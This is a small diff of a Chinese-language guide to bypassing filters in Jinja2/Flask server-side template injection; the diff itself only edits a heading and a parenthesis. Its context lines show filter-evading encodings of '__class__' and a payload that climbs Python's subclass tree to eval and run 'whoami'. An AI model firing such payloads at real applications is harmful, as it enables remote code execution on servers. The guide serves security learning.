@@ -232,7 +232,7 @@ if __name__ == '__main__':
 {{''["\x5f\x5f\x63las\x73\x5f\x5f"]}}
 ```
 
-2. 使用unicode编码（适用于Flask）
+2. 使用unicode编码（适用于Flask
 
 ```python
 {{''["\u005f\u005fclas\u0073\u005f\u005f"]}}
@@ -333,7 +333,7 @@ if __name__ == '__main__':
 {%print(''.__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()"))%}
 ```
 
-# 使用 Jinja2 过滤器绕过
+## 使用 Jinja2 过滤器绕过
 
 在 JinJa2 中内置了很多过滤器，变量可以通过过滤器进行修改，过滤器与变量之间用管道符号`|`隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号`|`连接多个过滤器，一个过滤器的输出应用于下一个过滤器。  
 内置过滤器列表如下：
